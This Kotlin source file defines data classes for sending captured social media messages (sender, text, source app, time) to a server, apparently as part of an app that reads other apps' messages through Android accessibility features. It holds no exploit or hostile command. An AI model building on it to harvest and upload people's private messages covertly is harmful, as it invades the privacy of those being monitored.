package com.hawkshaw.library.datalayer.models.accessibility

import com.hawkshaw.library.datalayer.models.PackageName
import com.hawkshaw.library.datalayer.room.socialmedia.SocialMediaEntity
import kotlinx.serialization.SerialName
import kotlinx.serialization.Serializable

/**
 * Request to push unprocessed social media messages to the server
 */
@Serializable
data class PushUnprocessedSocialMediaRequest(
    @SerialName("messages")
    val messages: List<UnprocessedSocialMediaMessage>
) {
    /**
     * Represents an unprocessed social media message instance
     */
    @Serializable
    data class UnprocessedSocialMediaMessage(
        @SerialName("id")
        val id: Int,
        
        @SerialName("title")
        val title: String,
        
        @SerialName("status")
        val status: String? = null,
        
        @SerialName("sender")
        val sender: String? = null,
        
        @SerialName("message")
        val message: String,
        
        @SerialName("type")
        val type: SocialMediaEntity.Type,
        
        @SerialName("application")
        val application: PackageName,
        
        @SerialName("time_string")
        val timeString: String
    )
} 